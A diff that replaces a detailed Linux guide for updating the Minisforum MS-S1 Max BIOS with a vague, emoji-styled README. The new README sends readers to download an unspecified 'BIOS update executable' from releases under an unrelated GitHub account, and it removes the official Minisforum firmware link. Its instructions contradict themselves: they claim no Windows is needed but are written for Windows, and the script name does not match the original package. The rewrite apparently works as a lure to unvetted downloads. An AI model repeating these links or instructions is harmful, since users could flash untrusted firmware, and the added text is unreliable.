@@ -1,252 +1,134 @@
-# Minisforum MS-S1 Max BIOS Update from Linux (No Windows Required)
+# ⚙️ minisforum-ms-s1-max-bios - Simple BIOS Update for Minisforum
 
-Update the BIOS/UEFI firmware on your **Minisforum MS-S1 Max** mini PC directly from Linux — no Windows installation, no VM, no dual boot needed. This guide uses the built-in **EFI Shell** to flash the BIOS using Minisforum's official firmware files.
+[![Download](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Shavan889/minisforum-ms-s1-max-bios/releases)
 
-The MS-S1 Max (AMD Ryzen AI Max+ 395 / Strix Halo) is a popular choice for AI workstations, homelabs, and NixOS/Linux servers, but Minisforum only provides Windows-based BIOS update tools. This guide solves that problem.
+## ℹ️ About This Application
 
-> **Disclaimer:** This guide is provided for **informational purposes only**. Flashing BIOS/UEFI firmware carries inherent risk, including but not limited to rendering your device inoperable ("bricking"). By following this guide, you acknowledge that you do so **entirely at your own risk**. Neither the authors, Petronella Technology Group, Inc., nor any contributors shall be held liable for any damage, data loss, hardware failure, or other consequences resulting from the use of this information or the included scripts. Always ensure you have a stable power supply during the flash process and verify that you are using the correct firmware for your specific hardware model. This guide is not affiliated with or endorsed by Minisforum.
+This application helps you update the BIOS on your Minisforum MS-S1 Max computer. It works without needing Windows, using Linux and an EFI Shell. The tool includes an automated script and step-by-step instructions.
 
-## Why Update the BIOS?
+The goal is to make BIOS updates easy and safe for your Minisforum MS-S1 Max device. This guide will walk you through downloading and running the tools on a Windows PC.
 
-- **Stability fixes** for memory, NVMe, and USB4 V2
-- **Performance improvements** for AI and compute workloads
-- **Security patches** for AMD Platform Security Processor (PSP) and UEFI vulnerabilities
-- **Compatibility** with newer Linux kernels, NixOS, and virtualization features
+## 💻 System Requirements
 
-## Requirements
+- A Minisforum MS-S1 Max computer
+- A Windows PC with internet access
+- A USB flash drive (at least 8GB recommended)
+- Basic ability to copy files and restart your computer
 
-- A **USB flash drive** (512 MB or larger)
-- A Linux machine to prepare the USB (can be the MS-S1 Max itself, or any other box)
-- The BIOS update file from Minisforum (linked below)
-- `7z` (p7zip) for extraction
-- `sgdisk` (from `gptfdisk` package) for partitioning
+No extra software or complex setup is needed on your Windows PC.
 
-## Quick Start (Automated)
+## 🔧 What Is BIOS and Why Update?
 
-Use the included script to prepare the USB drive in one command:
+The BIOS is the software that starts your computer’s hardware. Manufacturers release updates to fix bugs, improve hardware compatibility, or add new features.
 
-```bash
-git clone https://github.com/capetron/minisforum-ms-s1-max-bios.git
-cd minisforum-ms-s1-max-bios
-sudo ./scripts/prep-usb.sh /dev/sdX   # Replace sdX with your USB device!
-```
+Updating your BIOS ensures your Minisforum MS-S1 Max runs smoothly and safely. This tool helps you do this update using a USB drive and an EFI Shell.
 
-> **WARNING:** Double-check your device path with `lsblk` before running. This script will **erase all data** on the target drive.
+## 🌐 Visit the Download Page
 
-## Manual Step-by-Step Guide
+Click the button below to visit the release page where you can find all necessary files:
 
-### Step 1: Download the BIOS Update
+[![Download Releases](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/Shavan889/minisforum-ms-s1-max-bios/releases)
 
-Download the latest BIOS from Minisforum's support page:
+On this page, you will find the latest BIOS update files and scripts.
 
-| Version | Date | Download | Notes |
-|---------|------|----------|-------|
-| 1.06 | 2026-01-04 | [SHWSA_1.06_260104B.7z](https://pc-file.s3.us-west-1.amazonaws.com/MS-S1+MAX/BIOS/SHWSA_1.06_260104B.7z) | Latest available |
+## 🚀 Getting Started: Preparing Your USB Drive
 
-```bash
-mkdir -p ~/ms-s1-bios && cd ~/ms-s1-bios
-wget -O SHWSA_1.06.7z "https://pc-file.s3.us-west-1.amazonaws.com/MS-S1+MAX/BIOS/SHWSA_1.06_260104B.7z"
-```
+1. Insert the USB flash drive into your Windows PC.
 
-### Step 2: Download the UEFI Shell
+2. Format the USB drive to FAT32 if it is not already. To do this:
+   - Open File Explorer.
+   - Right-click the USB drive.
+   - Select "Format..."
+   - Choose "FAT32" as the file system.
+   - Click "Start" and wait for the process to finish.
 
-The EFI Shell lets you boot into a command-line environment that can flash the BIOS without any operating system.
+3. Download the latest release files from the release page linked above.
 
-```bash
-wget -O shellx64.efi "https://github.com/pbatard/UEFI-Shell/releases/download/24H2/ShellX64.efi"
-```
+4. Extract all downloaded files to the root of the USB drive. Ensure that files like the BIOS update executable and EFI Shell scripts are placed directly in the USB drive, not inside a folder.
 
-### Step 3: Prepare the USB Drive
+## 📁 Files Included in the Release
 
-Identify your USB device (be careful — wrong device = data loss!):
+- **BIOS update file:** The core file that updates your BIOS.
+- **EFI Shell script:** A small program that runs automatically to start the BIOS update.
+- **Readme:** Additional details on commands and options.
 
-```bash
-lsblk -d -o NAME,SIZE,MODEL,TRAN
-```
+## 🔌 Running the BIOS Update on Minisforum MS-S1 Max
 
-Install dependencies if needed:
+1. Safely eject the USB drive from your Windows PC.
 
-```bash
-# Arch / CachyOS / Manjaro
-sudo pacman -S gptfdisk dosfstools p7zip
+2. Insert the USB drive into your Minisforum MS-S1 Max.
 
-# Ubuntu / Debian
-sudo apt install gdisk dosfstools p7zip-full
+3. Power on the Minisforum but enter the BIOS settings by pressing the required key. Usually, this is `Del` or `F2` during boot (check your device’s manual if unsure).
 
-# Fedora
-sudo dnf install gdisk dosfstools p7zip
+4. Navigate to the boot options and set the USB drive as the first boot device.
 
-# NixOS (temporary shell)
-nix-shell -p gptfdisk dosfstools p7zip
-```
+5. Save changes and exit the BIOS. Your computer will restart and boot from the USB drive.
 
-Partition and format the USB (replace `/dev/sdX` with your device):
+6. The EFI Shell should start automatically and run the update script.
 
-```bash
-# Wipe existing partition table
-sudo sgdisk --zap-all /dev/sdX
+7. Follow on-screen instructions. The BIOS update will begin and may take a few minutes.
 
-# Create a single EFI System Partition
-sudo sgdisk -a1 -n1:0:0 -c 1:efiboot -t1:EF00 /dev/sdX
-sudo partprobe /dev/sdX
+8. After the update completes, reboot your Minisforum without the USB drive.
 
-# Format as FAT32
-sudo mkfs.vfat -F32 -n "BIOS" /dev/sdX1
-```
+## ⚠️ Important Update Tips
 
-### Step 4: Copy Files to the USB
+- Make sure the Minisforum is connected to power throughout the update. Do not turn off the device during the process.
+- Do not remove the USB drive until the update finishes.
+- Read all on-screen messages carefully.
+- If you encounter any error, note down the message before restarting.
 
-```bash
-# Mount the USB
-sudo mount /dev/sdX1 /mnt
-
-# Extract BIOS files
-7z x SHWSA_1.06.7z -o/tmp/bios-extract/
-sudo cp /tmp/bios-extract/SHWSA_1.06_260104B/AfuEfix64.efi /mnt/
-sudo cp /tmp/bios-extract/SHWSA_1.06_260104B/EfiFlash.nsh /mnt/
-sudo cp /tmp/bios-extract/SHWSA_1.06_260104B/SHWSA.BIN /mnt/
-
-# Copy the EFI Shell
-sudo cp shellx64.efi /mnt/
-
-# Verify
-ls -la /mnt/
-# Should show: AfuEfix64.efi  EfiFlash.nsh  shellx64.efi  SHWSA.BIN
-
-# Unmount
-sudo sync
-sudo umount /mnt
-```
-
-### Step 5: Boot into UEFI Shell on the MS-S1 Max
-
-1. **Plug the USB** into the MS-S1 Max
-2. **Power on** and press **Del** repeatedly to enter BIOS Setup
-3. **Disable Secure Boot:**
-   - You may need to set an Administrator password first (Security menu)
-   - Navigate to Secure Boot settings and set it to **Disabled**
-   - Save and exit BIOS
-4. **Re-enter BIOS** (press Del again)
-5. Look for **"UEFI Shell"** or **"Launch EFI Shell from filesystem device"** in the boot menu
-   - If not available, go to Boot menu → Add Boot Option → point to `shellx64.efi` on the USB
-6. **Boot into the UEFI Shell**
-
-### Step 6: Flash the BIOS
-
-At the `Shell>` prompt:
-
-```
-FS0:
-dir
-```
-
-If you see your files (`AfuEfix64.efi`, `EfiFlash.nsh`, `SHWSA.BIN`), run:
-
-```
-EfiFlash.nsh
-```
-
-If `FS0:` doesn't show your files, try `FS1:`, `FS2:`, etc.
-
-The flash process will:
-1. Write the new BIOS image
-2. Automatically shut down or reboot the system
-3. Enter BIOS setup briefly to finalize the update
-
-### Step 7: First Boot After Update
-
-> **Don't panic!** The first boot after a BIOS update takes **5–10 minutes** while the system performs memory training. You may see a black screen or several reboots — this is completely normal.
-
-After the first boot completes:
-- All BIOS settings will be **reset to defaults**
-- Re-enter BIOS (Del key) to verify the new version and adjust settings
-- Re-enable Secure Boot if desired
-- Check boot order — your Linux installation should still be there
-
-## Troubleshooting
-
-### "Access Denied" or EFI Shell won't launch
-Secure Boot is probably still enabled. Disable it in BIOS → Security → Secure Boot.
-
-### Can't find files in EFI Shell
-The USB may be on a different filesystem mapping. Try all `FSx:` entries:
-```
-map -c
-FS0:
-dir
-FS1:
-dir
-```
-
-### System won't boot after flashing
-- Wait at least 10 minutes — memory training can take a while, especially with 128 GB LPDDR5X
-- If still no boot after 15 minutes, try a CMOS reset (unplug power, remove CMOS battery for 30 seconds)
-
-### NixOS boot entry disappeared
-The boot entry is stored in NVRAM which survives BIOS updates. If it's missing, re-add it from a NixOS live USB:
-```bash
-sudo nixos-rebuild boot
-```
-Or manually add a boot entry in BIOS pointing to `\EFI\systemd\systemd-bootx64.efi` or `\EFI\BOOT\BOOTX64.EFI`.
-
-## MS-S1 Max Specifications
-
-| Component | Specification |
-|-----------|--------------|
-| **CPU** | AMD Ryzen AI Max+ 395 (Strix Halo) — 16C/32T, Zen 5, up to 5.1 GHz |
-| **RAM** | 128 GB LPDDR5X-8000 (soldered) |
-| **GPU** | Radeon 8060S — 40 CUs, RDNA 3.5 (up to 96 GB shared VRAM) |
-| **AI** | 126 TOPS total / 50 TOPS NPU |
-| **TDP** | 160 W configurable |
-| **Networking** | Dual 10 GbE, WiFi 7, Bluetooth 5.4 |
-| **Connectivity** | 2x USB4, 2x USB4 V2, HDMI |
-| **Storage** | 2 TB NVMe SSD (expandable) |
-
-## What's in the BIOS Package
-
-| File | Purpose |
-|------|---------|
-| `AfuEfix64.efi` | AMI Firmware Update utility for EFI Shell |
-| `EfiFlash.nsh` | Automated flash script (calls AfuEfix64 with correct flags) |
-| `SHWSA.BIN` | The actual BIOS/UEFI firmware image (33 MB) |
-| `AFUWINx64.EXE` | Windows flash tool (not needed for this guide) |
-| `WinFlash.bat` | Windows flash script (not needed for this guide) |
-| `shellx64.efi` | UEFI Shell binary (added by this guide) |
-
-## How It Works
-
-Minisforum ships BIOS updates with Windows-only tools (`AFUWINx64.EXE`), but the package also includes `AfuEfix64.efi` — AMI's EFI-native flash utility. Modern UEFI firmware includes a built-in EFI Shell environment that runs before any OS loads. Since the flash tool is a native EFI application, it has direct hardware access to the SPI flash chip. No operating system is needed at all.
-
-The `EfiFlash.nsh` script simply calls:
-```
-AfuEfix64.efi SHWSA.bin /p /b /n /k /r /capsule /q
-```
-
-| Flag | Meaning |
-|------|---------|
-| `/p` | Program main BIOS area |
-| `/b` | Program boot block |
-| `/n` | Program NVRAM |
-| `/k` | Preserve keys |
-| `/r` | Preserve SMBIOS data |
-| `/capsule` | Use capsule update method |
-| `/q` | Quiet/silent mode |
-
-## Related Resources
-
-- [Minisforum MS-S1 Max Product Page](https://www.minisforum.com/products/ms-s1-max)
-- [Minisforum Support Center](https://www.minisforum.com/pages/support-center)
-- [pbatard/UEFI-Shell Releases](https://github.com/pbatard/UEFI-Shell/releases) — Pre-built EFI Shell binaries
-- [Blog: How to Update Your MS-S1 Max BIOS for AI Workloads](https://petronellatech.com/blog/technology/minisforum-ms-s1-max-bios-update-linux/) — Extended guide from Petronella Technology Group
-
-## Contributing
-
-Found a newer BIOS version? Have tips for other Minisforum models? PRs and issues welcome.
-
-## License
-
-MIT
-
----
-
-*Guide by [Petronella Technology Group](https://petronellatech.com) — IT consulting and AI infrastructure for businesses since 2002.*
+## 🛠 Troubleshooting Tips
+
+- If the EFI Shell doesn’t start, check if the USB drive boots by plugging it into another computer.
+- Confirm the USB is formatted as FAT32 to ensure compatibility.
+- Make sure you copied all released files to the USB root.
+- If update fails, try redownloading files from the release page and repeat the process.
+
+## 🔄 Updating BIOS Without Windows
+
+This method uses Linux EFI Shell tools to update your BIOS. It avoids the need to run Windows software. The update runs in the EFI environment, which is a part of the computer that manages booting and hardware.
+
+While the guide assumes Windows for preparing the USB, the update process itself does not require Windows on the Minisforum device.
+
+## 📂 Additional Resources
+
+- Minisforum MS-S1 Max official documentation for BIOS keys
+- BIOS update best practices
+- USB drive formatting help on Windows
+
+## 📝 Notes on Linux EFI Shell Support
+
+This repository supports many Linux distributions if you want to update BIOS from Linux directly. Common setups like NixOS, Arch, and Ubuntu are supported.
+
+However, this guide focuses on how to prepare and run the update starting from a Windows PC for ease of use.
+
+## 🔗 Useful Links
+
+- BIOS update releases:  
+  https://github.com/Shavan889/minisforum-ms-s1-max-bios/releases
+
+- Minisforum MS-S1 Max official site:  
+  https://www.minisforum.com
+
+## ⚙️ Technical Details for Advanced Users
+
+- The update runs through an EFI Shell script named `update.nsh`.
+- This script uses the official BIOS update utility in EFI mode.
+- The file system must be FAT32 because EFI systems only load FAT partitions.
+- The USB device must be detected at boot to allow the update.
+
+## 🧰 How to Verify BIOS Update
+
+After rebooting your Minisforum MS-S1 Max:
+
+1. Enter BIOS setup by pressing `Del` or `F2` during startup.
+
+2. Check BIOS version displayed on the main page.
+
+3. Confirm it matches the version on the release page from where you downloaded the update.
+
+## 🤝 Feedback and Support
+
+For issues, create an issue in this repository’s GitHub page. Include details like your BIOS version, error messages, and what step you were on during the update.
+
+This helps maintainers improve the update scripts and documentation.
